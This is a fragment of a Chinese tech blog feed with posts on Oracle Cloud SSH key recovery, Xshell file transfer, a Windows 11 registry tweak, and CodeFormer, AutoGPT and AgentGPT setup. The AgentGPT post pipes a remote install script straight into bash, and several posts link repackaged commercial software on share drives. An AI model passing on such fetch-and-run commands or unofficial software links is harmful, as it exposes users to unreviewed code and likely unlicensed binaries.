<h1 id="TopazVideoAI-3-2-4-CN-Portable"><a href="#TopazVideoAI-3-2-4-CN-Portable" class="headerlink" title="TopazVideoAI_3.2.4_CN_Portable"></a>TopazVideoAI_3.2.4_CN_Portable</h1><p><a href="https://www.123pan.com/s/zuYeVv-i3Kbd.html">https://www.123pan.com/s/zuYeVv-i3Kbd.html</a><br>提取码:pIxW</p>
<h1 id="17G-Topaz-Video-AI-3-x通用模型"><a href="#17G-Topaz-Video-AI-3-x通用模型" class="headerlink" title="17G Topaz Video AI 3.x通用模型"></a>17G Topaz Video AI 3.x通用模型</h1><p><a href="https://www.123pan.com/s/zuYeVv-t3Kbd.html">https://www.123pan.com/s/zuYeVv-t3Kbd.html</a><br>提取码:OO5w</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>topaz</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>topaz</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle cloud 甲骨文云服务器 遗失ssh秘钥的解决办法</title>
    <url>/posts/c69ad118/</url>
    <content><![CDATA[<h1 id="1、新建秘钥对"><a href="#1、新建秘钥对" class="headerlink" title="1、新建秘钥对"></a>1、新建秘钥对</h1><p>这里以Xshell为例，菜单栏-&gt;工具-&gt;新建秘钥向导，下一步下一步生成公钥和私钥，可以将它们全部导出成文件。<br><img src="/img/oracle/1.webp" alt="d6141509dbe86979639a0919dbed1a4c"></p>
<h1 id="2、创建一台新的实例B"><a href="#2、创建一台新的实例B" class="headerlink" title="2、创建一台新的实例B"></a>2、创建一台新的实例B</h1><h1 id="3、Xshell使用上面的私钥opc用户登录已经创建的这台服务器，sudo-i可以切换root用户，供后面使用"><a href="#3、Xshell使用上面的私钥opc用户登录已经创建的这台服务器，sudo-i可以切换root用户，供后面使用" class="headerlink" title="3、Xshell使用上面的私钥opc用户登录已经创建的这台服务器，sudo -i可以切换root用户，供后面使用"></a>3、Xshell使用上面的私钥opc用户登录已经创建的这台服务器，sudo -i可以切换root用户，供后面使用</h1><h1 id="4、重置登录不上服务器秘钥"><a href="#4、重置登录不上服务器秘钥" class="headerlink" title="4、重置登录不上服务器秘钥"></a>4、重置登录不上服务器秘钥</h1><p>（1）停止之前登录不上的服务器A<br><img src="/img/oracle/2.webp" alt="b704896b5773e068b437042cc1be1712"><br>（2）分离这台服务器A的引导卷，停止服务器A后，可以在下面分离引导卷，稍后会将这台服务器A挂载到上面我们已经创建的服务器B进行秘钥修改。<br><img src="/img/oracle/3.webp" alt="ad5997b9b9ceb15450a9b961c6880a22"><br>（3）切换至服务器B的细节页面，将已经分离的引导卷重新附加到服务器B<br><img src="/img/oracle/4.webp" alt="04e6db8975748d09a257ffc942c43c6e"><br>（4）点击附加后的选项查看iSCSI命令<br><img src="/img/oracle/5.webp" alt="239a7de66e256486937c99efa45c947f"><br>（5）切换到Xshell收费服务器控制台，依次执行上图中红框命令，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l /dev/sdb</span><br></pre></td></tr></table></figure>
<p>如果查看到磁盘信息，应该就已经附加成功。<br><img src="/img/oracle/6.webp" alt="2e5d436ec49f89a7b45abe2fdd9422bd"><br>（6）挂载、执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -o nouuid /dev/sdb3 /mnt</span><br></pre></td></tr></table></figure>
<p>如果此步报错，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/sdb3 /mnt</span><br></pre></td></tr></table></figure>
<p>（7）如果到了这一步，即将就ok了，修改公钥，继续执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi /mnt/home/opc/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>键盘按两次d可以删除已有秘钥，按i键进入编辑，将上面准备的公钥文件内容，记住是公钥，全部粘贴到里面，注意空格和换行，按ESC-&gt;按住shift+两次z键，保存退出<br>（8）解除挂载，执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo umount /mnt</span><br></pre></td></tr></table></figure>
<p>（9）执行下图红框中命令，分离引导卷<br><img src="/img/oracle/7.webp" alt="ad6672a2b60ee6823f895fe485310e9b"><br>（10）网页操作界面分离<br><img src="/img/oracle/8.webp" alt="0c4de4b5965b82fbac0d9ee7a2f60bcc"><br>（11）重新将这个卷挂载到终免服务器上，然后启动服务器，这样就可以使用刚刚上面生成的私钥登录这台服务器了，至此ssh秘钥修改完毕<br><img src="/img/oracle/9.webp" alt="201890d872192b43af9fd64dfb5d9cb8"></p>
]]></content>
      <categories>
        <category>vps</category>
        <category>oracle cloud</category>
      </categories>
      <tags>
        <tag>vps</tag>
        <tag>oracle cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>windows下怎么用 xshell/securecrt 从 linux 系统上传和下载文件</title>
    <url>/posts/3aabb3be/</url>
    <content><![CDATA[<p>xshell<br><a href="https://www.123pan.com/s/zuYeVv-rYKbd.html">https://www.123pan.com/s/zuYeVv-rYKbd.html</a> 提取码:cMB5<br>xftp7 v7.0.0097中文版<br><a href="https://www.123pan.com/s/zuYeVv-DYKbd.html">https://www.123pan.com/s/zuYeVv-DYKbd.html</a> 提取码:gbUO</p>
<p>Xshell-7软件下载</p>
<p><a href="https://wwsf.lanzn.com/igVz12fjmyjc">https://wwsf.lanzn.com/igVz12fjmyjc</a> 密码:bgad</p>
<h1 id="1、设置XShell或SecureCRT工具ZMODEM上传和下载路径"><a href="#1、设置XShell或SecureCRT工具ZMODEM上传和下载路径" class="headerlink" title="1、设置XShell或SecureCRT工具ZMODEM上传和下载路径"></a>1、设置XShell或SecureCRT工具ZMODEM上传和下载路径</h1><p>打开XShell或SecureCRT登录工具，在选项对话框中，选择最下面的ZMODEM，勾选自动激活ZMODEM。在文件传输选项中填写下载和加载(即上传)的路径，2个路径可以一样也可以不一样。不过路径填不填写都没有关系，因为如果不填写路径的话，在执行上传和下载时出自动弹出文件选择和保存对话框的。<br><img src="/img/xshell/1.webp" alt="23084423_63548e67588f051078"><br>Windows下怎么用XShell&#x2F;SecureCRT从Linux系统上传和下载文件？_上传 下载</p>
<h1 id="2、在Linux主机上，安装上传下载工具包rz及sz"><a href="#2、在Linux主机上，安装上传下载工具包rz及sz" class="headerlink" title="2、在Linux主机上，安装上传下载工具包rz及sz"></a>2、在Linux主机上，安装上传下载工具包rz及sz</h1><p>如果不知道你要安装包的具体名称，可以使用yum provides *&#x2F;name 进行查找系统自带软件包的信息；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum provides */rz</span><br><span class="line"><span class="comment">#下面是软件包信息</span></span><br><span class="line">lrzsz-0.12.20-27.1.el6.i686 : The lrz and lsz modem communications programs</span><br><span class="line">Repo        : base</span><br><span class="line">Filename    : /usr/bin/rz</span><br></pre></td></tr></table></figure>
<p>一般会列出软件包的名称及版本，还有安装路径；查询到软件包名后，使用yum install -y 包名 进行安装。<br>lrzsz包安装完成后包括上传rz、下载sz命令；只需要安装这个包即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y lrzsz</span><br></pre></td></tr></table></figure>
<h1 id="3、从Windows上传文件"><a href="#3、从Windows上传文件" class="headerlink" title="3、从Windows上传文件"></a>3、从Windows上传文件</h1><p>上传命令为rz；在Linux命令行下输入rz，上传的文件在当前命令行的目录下；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rz 文件名</span><br></pre></td></tr></table></figure>
<p>输入rz命令后，会弹出对话框，选择你要上传的文件，选择打开就上传到Linux主机。上传完可以使用ls 查看；<br><img src="/img/xshell/2.webp" alt="23084423_63548e678fb4870465"></p>
<h1 id="4、从Linux主机下载文件"><a href="#4、从Linux主机下载文件" class="headerlink" title="4、从Linux主机下载文件"></a>4、从Linux主机下载文件</h1><p>下载命令为sz ，后面跟要下载的文件名；可以选择下载的保存文件夹；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sz 文件名</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>tools</category>
        <category>xshell</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>xshell</tag>
      </tags>
  </entry>
  <entry>
    <title>windows11 右键刷新按钮的调出方法</title>
    <url>/posts/8d41d802/</url>
    <content><![CDATA[<h1 id="windows系统中的右键刷新是我们经常会使用的功能，可以让用户快速显示更改后的设置和界面图标情况。但是在win11系统中，很多朋友发现找不到右键刷新了，这时候我们可以通过将界面改回原版模式来调出刷新，下面就一起来看看吧。"><a href="#windows系统中的右键刷新是我们经常会使用的功能，可以让用户快速显示更改后的设置和界面图标情况。但是在win11系统中，很多朋友发现找不到右键刷新了，这时候我们可以通过将界面改回原版模式来调出刷新，下面就一起来看看吧。" class="headerlink" title="windows系统中的右键刷新是我们经常会使用的功能，可以让用户快速显示更改后的设置和界面图标情况。但是在win11系统中，很多朋友发现找不到右键刷新了，这时候我们可以通过将界面改回原版模式来调出刷新，下面就一起来看看吧。"></a>windows系统中的右键刷新是我们经常会使用的功能，可以让用户快速显示更改后的设置和界面图标情况。但是在win11系统中，很多朋友发现找不到右键刷新了，这时候我们可以通过将界面改回原版模式来调出刷新，下面就一起来看看吧。</h1><h1 id="1、先在键盘上同时按下“win-r”，就可以调出运行对话框。"><a href="#1、先在键盘上同时按下“win-r”，就可以调出运行对话框。" class="headerlink" title="1、先在键盘上同时按下“win+r”，就可以调出运行对话框。"></a>1、先在键盘上同时按下“win+r”，就可以调出运行对话框。</h1><h1 id="2、在其中输入“regedit”，回车确定，就能打开注册表编辑器。"><a href="#2、在其中输入“regedit”，回车确定，就能打开注册表编辑器。" class="headerlink" title="2、在其中输入“regedit”，回车确定，就能打开注册表编辑器。"></a>2、在其中输入“regedit”，回车确定，就能打开注册表编辑器。</h1><h1 id="3、打开后复制这个路径到上方路径框中：“HKEY-LOCAL-MACHINE-SYSTEM-CurrentControlSet-Control-FeatureManagement-Overrides-4”"><a href="#3、打开后复制这个路径到上方路径框中：“HKEY-LOCAL-MACHINE-SYSTEM-CurrentControlSet-Control-FeatureManagement-Overrides-4”" class="headerlink" title="3、打开后复制这个路径到上方路径框中：“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FeatureManagement\Overrides\4”"></a>3、打开后复制这个路径到上方路径框中：“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FeatureManagement\Overrides\4”</h1><p><img src="/img/win11/1.webp" alt="20210707092157_88050"></p>
<h1 id="4、然后右键选中“4”文件夹，新建一个名为“586118283”的项，如图所示。"><a href="#4、然后右键选中“4”文件夹，新建一个名为“586118283”的项，如图所示。" class="headerlink" title="4、然后右键选中“4”文件夹，新建一个名为“586118283”的项，如图所示。"></a>4、然后右键选中“4”文件夹，新建一个名为“586118283”的项，如图所示。</h1><p><img src="/img/win11/2.webp" alt="20210707092244_55111"></p>
<h1 id="5、接着在新建的项中再新建5个“DWORD值”分别命名为"><a href="#5、接着在新建的项中再新建5个“DWORD值”分别命名为" class="headerlink" title="5、接着在新建的项中再新建5个“DWORD值”分别命名为"></a>5、接着在新建的项中再新建5个“DWORD值”分别命名为</h1><p>“EnabledState”<br>“EnabledStateOptions”<br>“Variant”“VariantPayload”<br>“VariantPayloadKind”</p>
<h1 id="6、将他们的值分别设置为"><a href="#6、将他们的值分别设置为" class="headerlink" title="6、将他们的值分别设置为"></a>6、将他们的值分别设置为</h1><p>“0x00000001”<br>“0x00000001”<br>“0x00000000”<br>“0x00000000”<br>“0x00000000”<br><img src="/img/win11/3.webp" alt="20210707092341_83683"></p>
<h1 id="7、设置完成后只要重启电脑，然后右键菜单中就会出现刷新了。"><a href="#7、设置完成后只要重启电脑，然后右键菜单中就会出现刷新了。" class="headerlink" title="7、设置完成后只要重启电脑，然后右键菜单中就会出现刷新了。"></a>7、设置完成后只要重启电脑，然后右键菜单中就会出现刷新了。</h1>]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>codeformer ai 图片,视频修复软件</title>
    <url>/posts/e358b0f7/</url>
    <content><![CDATA[<h1 id="CodeFormer-免费开源项目-GitHub-："><a href="#CodeFormer-免费开源项目-GitHub-：" class="headerlink" title="CodeFormer 免费开源项目 GitHub ："></a>CodeFormer 免费开源项目 GitHub ：</h1><p><a href="https://github.com/sczhou/CodeFormer">https://github.com/sczhou/CodeFormer</a></p>
<h1 id="安装python（记得勾选-Add-python-exe-to-PATH"><a href="#安装python（记得勾选-Add-python-exe-to-PATH" class="headerlink" title="安装python（记得勾选 Add python.exe to PATH)"></a>安装python（记得勾选 Add python.exe to PATH)</h1><p><a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a><br>检验安装是否成功</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>
<h1 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h1><p><a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a><br>检验安装是否成功</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">git -v</span><br></pre></td></tr></table></figure>
<h1 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h1><p><a href="https://www.anaconda.com/download">https://www.anaconda.com/download</a><br>检验安装是否成功</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure>
<p>（cmd识别不到conda的话，手动设置一下PATH的anaconda3安装路径和anaconda3\Scripts路径）</p>
<h1 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h1><p><a href="https://pytorch.org/get-started/locally/">https://pytorch.org/get-started/locally/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#例：用Conda安装带有N卡的CUDA11.8</span><br><span class="line">conda install pytorch torchvision torchaudio pytorch-cuda=11.8 -c pytorch -c nvidia</span><br></pre></td></tr></table></figure>
<h1 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/sczhou/CodeFormer</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> CodeFormer</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt -q</span><br><span class="line"></span><br><span class="line">pip install -q gradio</span><br><span class="line"></span><br><span class="line">python basicsr/setup.py develop</span><br></pre></td></tr></table></figure>
<h1 id="下载预训练模型"><a href="#下载预训练模型" class="headerlink" title="下载预训练模型"></a>下载预训练模型</h1><h2 id="1-可以手动下载预训练模型到weights-facelib文件夹或通过运行以下命令下载"><a href="#1-可以手动下载预训练模型到weights-facelib文件夹或通过运行以下命令下载" class="headerlink" title="1.可以手动下载预训练模型到weights&#x2F;facelib文件夹或通过运行以下命令下载"></a>1.可以手动下载<a href="https://entuedu-my.sharepoint.com/personal/s200094_e_ntu_edu_sg/_layouts/15/onedrive.aspx?id=/personal/s200094_e_ntu_edu_sg/Documents/Paper_Shangchen/CodeFormer/pretrained_models/facelib&ga=1">预训练模型</a>到weights&#x2F;facelib文件夹或通过运行以下命令下载</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python scripts/download_pretrained_models.py facelib</span><br></pre></td></tr></table></figure>
<h2 id="2-可以手动下载预训练模型到weights-CodeFormer文件夹或通过运行以下命令下载"><a href="#2-可以手动下载预训练模型到weights-CodeFormer文件夹或通过运行以下命令下载" class="headerlink" title="2.可以手动下载预训练模型到weights&#x2F;CodeFormer文件夹或通过运行以下命令下载"></a>2.可以手动下载<a href="https://entuedu-my.sharepoint.com/personal/s200094_e_ntu_edu_sg/_layouts/15/onedrive.aspx?id=/personal/s200094_e_ntu_edu_sg/Documents/Paper_Shangchen/CodeFormer/pretrained_models/CodeFormer&ga=1">预训练模型</a>到weights&#x2F;CodeFormer文件夹或通过运行以下命令下载</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python scripts/download_pretrained_models.py CodeFormer</span><br></pre></td></tr></table></figure>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="面部修复（裁剪和对齐的面部）"><a href="#面部修复（裁剪和对齐的面部）" class="headerlink" title="面部修复（裁剪和对齐的面部）"></a>面部修复（裁剪和对齐的面部）</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">For</span> cropped and aligned faces</span><br><span class="line"></span><br><span class="line">python inference_codeformer.py -w <span class="number">0</span>.<span class="number">5</span> --has_aligned --input_path [input folder]</span><br></pre></td></tr></table></figure>
<h2 id="整体图像增强"><a href="#整体图像增强" class="headerlink" title="整体图像增强"></a>整体图像增强</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">For</span> whole image</span><br><span class="line"># Add &#x27;--bg_upsampler realesrgan&#x27; to enhance the background regions with Real-ESRGAN</span><br><span class="line"># Add &#x27;--face_upsample&#x27; to further upsample restorated face with Real-ESRGAN</span><br><span class="line"></span><br><span class="line">python inference_codeformer.py -w <span class="number">0</span>.<span class="number">7</span> --input_path [image folder/image <span class="built_in">path</span>]</span><br></pre></td></tr></table></figure>
<h2 id="视频增强"><a href="#视频增强" class="headerlink" title="视频增强"></a>视频增强</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">For</span> video clips</span><br><span class="line"></span><br><span class="line">python inference_codeformer.py --bg_upsampler realesrgan --face_upsample -w <span class="number">1</span>.<span class="number">0</span> --input_path</span><br></pre></td></tr></table></figure>
<p>保真度权重w位于 [0, 1] 中。通常，较小的w往往会产生较高质量的结果，而较大的w会产生较高保真度的结果。<br>结果将保存在results文件夹中。</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>codeformer</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>codeformer</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd 常用命令</title>
    <url>/posts/701d9ff3/</url>
    <content><![CDATA[<h1 id="目录-类似于linux下的cd"><a href="#目录-类似于linux下的cd" class="headerlink" title="目录(类似于linux下的cd)"></a>目录(类似于linux下的cd)</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"># 进入d盘</span><br><span class="line"><span class="function">D:</span></span><br><span class="line"><span class="function"># 进入<span class="title">F</span>盘</span></span><br><span class="line"><span class="function"><span class="title">F</span>:</span></span><br><span class="line"><span class="function">#跳转到硬盘的根目录</span></span><br><span class="line"><span class="function"><span class="title">cd</span> \      </span></span><br><span class="line"><span class="function">#跳转到上一层目录</span></span><br><span class="line"><span class="function"><span class="title">cd</span>..      </span></span><br></pre></td></tr></table></figure>
<p>查看目录文件</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#查看当前目录下的文件，类似于linux下的ls</span><br><span class="line"><span class="built_in">dir</span></span><br></pre></td></tr></table></figure>
<h1 id="创建目录和删除目录"><a href="#创建目录和删除目录" class="headerlink" title="创建目录和删除目录"></a>创建目录和删除目录</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#创建目录</span><br><span class="line"><span class="built_in">md</span> 目录名（文件夹）</span><br><span class="line">#删除目录</span><br><span class="line"><span class="built_in">rd</span> 目录名（文件夹）</span><br></pre></td></tr></table></figure>
<h1 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span></span><br></pre></td></tr></table></figure>
<h1 id="清除屏幕-类似于linux下的clear"><a href="#清除屏幕-类似于linux下的clear" class="headerlink" title="清除屏幕(类似于linux下的clear)"></a>清除屏幕(类似于linux下的clear)</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cls</span></span><br></pre></td></tr></table></figure>
<h1 id="cmd命令中，按键盘的向上箭头可以直接复制前一个命令"><a href="#cmd命令中，按键盘的向上箭头可以直接复制前一个命令" class="headerlink" title="cmd命令中，按键盘的向上箭头可以直接复制前一个命令"></a>cmd命令中，按键盘的向上箭头可以直接复制前一个命令</h1><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"># 复制文件：把一个文件拷贝到另一个地方。 </span><br><span class="line"><span class="built_in">copy</span> 路径\文件名 路径\文件名 </span><br><span class="line"># 移动文件 ：把一个文件移动（就是剪切+复制）到另一个地方。 </span><br><span class="line"><span class="built_in">move</span> 路径\文件名 路径\文件名</span><br><span class="line"># 删除文件：这个是专门删除文件的，不能删除文件夹</span><br><span class="line"><span class="built_in">del</span> 文件名</span><br></pre></td></tr></table></figure>
<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#用来测试网络是否畅通</span><br><span class="line"><span class="built_in">ping</span> ip(主机名)</span><br></pre></td></tr></table></figure>
<h1 id="终止一直在运行的命令ctrl-c"><a href="#终止一直在运行的命令ctrl-c" class="headerlink" title="终止一直在运行的命令ctrl+c"></a>终止一直在运行的命令ctrl+c</h1><p>有时某个命令一直打印输出结果(如ping 192.168.1.10 -t)，我们想终止这个命令的执行，直接按ctrl+c即可</p>
<h1 id="退出环境-python等"><a href="#退出环境-python等" class="headerlink" title="退出环境(python等)"></a>退出环境(python等)</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>() 回车</span><br><span class="line">或</span><br><span class="line">quit() 回车</span><br><span class="line">或</span><br><span class="line">ctrl + z 回车</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
        <category>cmd</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>autogpt 安装教程</title>
    <url>/posts/49891633/</url>
    <content><![CDATA[<h1 id="安装-Python-环境，且版本在3-10及以上"><a href="#安装-Python-环境，且版本在3-10及以上" class="headerlink" title="安装 Python 环境，且版本在3.10及以上"></a>安装 Python 环境，且版本在3.10及以上</h1><p><a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p>
<h1 id="安装好-git-工具"><a href="#安装好-git-工具" class="headerlink" title="安装好 git 工具"></a>安装好 git 工具</h1><p><a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p>
<h1 id="有可用的-OpenAI-账号-API-keys"><a href="#有可用的-OpenAI-账号-API-keys" class="headerlink" title="有可用的 OpenAI 账号 API keys"></a>有可用的 OpenAI 账号 API keys</h1><p><a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
<h1 id="下载项目代码，新建一个文件夹下打开终端，克隆项目"><a href="#下载项目代码，新建一个文件夹下打开终端，克隆项目" class="headerlink" title="下载项目代码，新建一个文件夹下打开终端，克隆项目"></a>下载项目代码，新建一个文件夹下打开终端，克隆项目</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Significant-Gravitas/Auto-GPT.git</span><br></pre></td></tr></table></figure>
<h1 id="下载完成后，cd-到项目文件夹路径下"><a href="#下载完成后，cd-到项目文件夹路径下" class="headerlink" title="下载完成后，cd 到项目文件夹路径下"></a>下载完成后，cd 到项目文件夹路径下</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span>  Auto-GPT</span><br></pre></td></tr></table></figure>
<h1 id="运行以下代码安装所需要的依赖"><a href="#运行以下代码安装所需要的依赖" class="headerlink" title="运行以下代码安装所需要的依赖"></a>运行以下代码安装所需要的依赖</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<h1 id="获取自己的OpenAI密钥-https-platform-openai-com-account-api-keys-创建自己的密钥以后，在AutoGPT文件下找到配置文件-env-template-在里面替换自己的openAI-key"><a href="#获取自己的OpenAI密钥-https-platform-openai-com-account-api-keys-创建自己的密钥以后，在AutoGPT文件下找到配置文件-env-template-在里面替换自己的openAI-key" class="headerlink" title="获取自己的OpenAI密钥 https://platform.openai.com/account/api-keys 创建自己的密钥以后，在AutoGPT文件下找到配置文件 .env.template 在里面替换自己的openAI key"></a>获取自己的OpenAI密钥 <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a> 创建自己的密钥以后，在AutoGPT文件下找到配置文件 .env.template 在里面替换自己的openAI key</h1><h1 id="以上步骤完成后，终端输入以下命令，就可以使用-AutoGPT-了"><a href="#以上步骤完成后，终端输入以下命令，就可以使用-AutoGPT-了" class="headerlink" title="以上步骤完成后，终端输入以下命令，就可以使用 AutoGPT 了"></a>以上步骤完成后，终端输入以下命令，就可以使用 AutoGPT 了</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python -m autogpt</span><br></pre></td></tr></table></figure>
<h1 id="如果想在使用过程中，查看具体AutoGPT-是否报错，可以加上-–debug-参数"><a href="#如果想在使用过程中，查看具体AutoGPT-是否报错，可以加上-–debug-参数" class="headerlink" title="如果想在使用过程中，查看具体AutoGPT 是否报错，可以加上 –debug 参数"></a>如果想在使用过程中，查看具体AutoGPT 是否报错，可以加上 –debug 参数</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python -m autogpt --debug</span><br></pre></td></tr></table></figure>
<h1 id="使用-AutoGPT-需要注意的一些问题："><a href="#使用-AutoGPT-需要注意的一些问题：" class="headerlink" title="使用 AutoGPT 需要注意的一些问题："></a>使用 AutoGPT 需要注意的一些问题：</h1><p>1，openAI 接口，SSL 认证失败 443<br>ssl.SSLEOFError: EOF occurred in violation of protocol (_ssl.c:1131)requests.exceptions.SSLError: HTTPSConnectionPool(host&#x3D;’openaipublic.blob.core.windows.net’, port&#x3D;443): Max retries exceeded with url: &#x2F;encodings&#x2F;cl100k_base.tiktoken (Caused by SSLError(SSLEOFError(8, ‘EOF occurred in violation of protocol (_ssl.c:1131)’)))</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">pip install urllib3==<span class="number">1</span>.<span class="number">25</span>.<span class="number">11</span></span><br></pre></td></tr></table></figure>
<h1 id="重点说明下，如果你在中国大陆，由于终端走的-google-搜索-是在-IP-层，不在应用层，所以一般应用层的梯子也是无法使用的，建议使用Clash-并开启TUN模式！"><a href="#重点说明下，如果你在中国大陆，由于终端走的-google-搜索-是在-IP-层，不在应用层，所以一般应用层的梯子也是无法使用的，建议使用Clash-并开启TUN模式！" class="headerlink" title="重点说明下，如果你在中国大陆，由于终端走的 google 搜索 是在 IP 层，不在应用层，所以一般应用层的梯子也是无法使用的，建议使用Clash 并开启TUN模式！"></a>重点说明下，如果你在中国大陆，由于终端走的 google 搜索 是在 IP 层，不在应用层，所以一般应用层的梯子也是无法使用的，建议使用Clash 并开启TUN模式！</h1>]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
        <tag>autogpt</tag>
      </tags>
  </entry>
  <entry>
    <title>agentgpt，在vps上通过 docker 部署安装</title>
    <url>/posts/3addb925/</url>
    <content><![CDATA[<h1 id="1-首先你需要准备一台VPS"><a href="#1-首先你需要准备一台VPS" class="headerlink" title="1.首先你需要准备一台VPS"></a>1.首先你需要准备一台VPS</h1><h1 id="然后通过SSH连接工具进去（自己选一个）"><a href="#然后通过SSH连接工具进去（自己选一个）" class="headerlink" title="然后通过SSH连接工具进去（自己选一个）"></a>然后通过SSH连接工具进去（自己选一个）</h1><p>FinalShell<br><a href="http://www.hostbuf.com/t/988.html">http://www.hostbuf.com/t/988.html</a><br>Putty<br><a href="https://www.putty.org/">https://www.putty.org/</a><br>XShell 7<br><a href="https://dqunying2.jb51.net/202012/tools/Xshell7ls_757444_jb51.rar">https://dqunying2.jb51.net/202012/tools/Xshell7ls_757444_jb51.rar</a></p>
<h1 id="依次执行以下命令："><a href="#依次执行以下命令：" class="headerlink" title="依次执行以下命令："></a>依次执行以下命令：</h1><p>如果没有安装Curl的话，我们需要提前安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Debian</span></span><br><span class="line">sudo apt install -y curl</span><br><span class="line"><span class="comment">#CentOS</span></span><br><span class="line"> sudo yum install -y curl</span><br></pre></td></tr></table></figure>
<h1 id="2-然后通过Docker一键安装脚本进行部署："><a href="#2-然后通过Docker一键安装脚本进行部署：" class="headerlink" title="2.然后通过Docker一键安装脚本进行部署："></a>2.然后通过Docker一键安装脚本进行部署：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -sSL https://cdn.jsdelivr.net/gh/SuperManito/LinuxMirrors@main/DockerInstallation.sh)</span><br></pre></td></tr></table></figure>
<p>里面选择DOCKER CE源渠道，有八个可以选择。<br>包括我们可以选择Docker Engine、Compose等，然后就自动一键安装。</p>
<h1 id="3-下载并安装AgentGPT开源程序："><a href="#3-下载并安装AgentGPT开源程序：" class="headerlink" title="3.下载并安装AgentGPT开源程序："></a>3.下载并安装AgentGPT开源程序：</h1><p><a href="https://github.com/reworkd/AgentGPT">https://github.com/reworkd/AgentGPT</a></p>
<h1 id="先安装下Git："><a href="#先安装下Git：" class="headerlink" title="先安装下Git："></a>先安装下Git：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#Centos</span></span><br><span class="line">sudo yum install git</span><br><span class="line"> <span class="comment">#Debian</span></span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>
<p>4.下载 AgentGPT 源码：</p>
